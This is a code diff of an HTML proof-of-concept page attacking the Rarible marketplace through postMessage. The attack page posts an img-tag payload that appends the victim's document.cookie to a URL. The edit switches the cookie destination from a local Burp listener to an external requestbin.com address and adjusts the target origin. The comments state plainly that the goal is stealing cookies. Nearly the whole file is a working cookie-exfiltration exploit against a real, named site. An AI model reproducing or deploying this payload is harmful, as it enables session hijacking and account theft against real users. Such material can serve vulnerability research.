@@ -10,16 +10,16 @@
     <p>This page sends a malicious payload to the target website (Rarible).</p>
 
     <script>
-        // When the malicious page loads, send the crafted postMessage to Rarible
         window.onload = function() {
-            // Define the malicious message that will trigger the vulnerable Rarible listener
+            // Define the malicious message
             const maliciousMessage = {
-                event: "malicious_payload",  // This is the data that Rarible's event listener will match against
-                payload: "<img src='http://127.0.0.1:8081/log?cookie=" + document.cookie + "' />"  // Steal cookies by sending them to Burp Suite listener
+                event: "malicious_payload",
+                // Send cookies to an external server (like RequestBin)
+                payload: "<img src='https://requestbin.com/r/xyz123?cookie=" + encodeURIComponent(document.cookie) + "' />"
             };
 
             // Send the malicious postMessage to the Rarible page
-            window.postMessage(maliciousMessage, "https://rarible.com/collection/base/0x5a9bc3d3f851f5a08c0de476ab7cc3a07cd49777/drops");  // Target Rarible's origin
+            window.postMessage(maliciousMessage, "https://rarible.com");
         };
     </script>
 </body>
